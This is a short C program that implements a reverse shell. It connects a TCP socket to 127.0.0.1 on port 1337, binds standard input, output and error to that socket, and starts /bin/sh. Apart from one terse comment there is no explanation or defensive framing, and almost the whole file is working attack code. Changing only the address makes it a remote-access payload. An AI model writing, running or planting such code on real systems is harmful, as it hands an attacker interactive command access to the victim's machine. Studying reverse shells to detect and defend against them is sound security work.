#include <stdio.h>
#include <sys/socket.h>
#include <stdlib.h>
#include <netinet/in.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#define PORT 1337
  
int main(int argc, char const *argv[])
{
    int socketFD ;
    socketFD = socket(AF_INET,SOCK_STREAM,0);
    struct  sockaddr_in client;
    client.sin_family = AF_INET;
    client.sin_addr.s_addr = inet_addr("127.0.0.1");
    client.sin_port = htons(PORT);    
    connect(socketFD,(struct  sockaddr*)&client,sizeof(client));
    dup2(socketFD,0);//STDIN
    dup2(socketFD,2);
    dup2(socketFD,1);
 
      
  execv("/bin/sh",NULL);
  return 0;
}

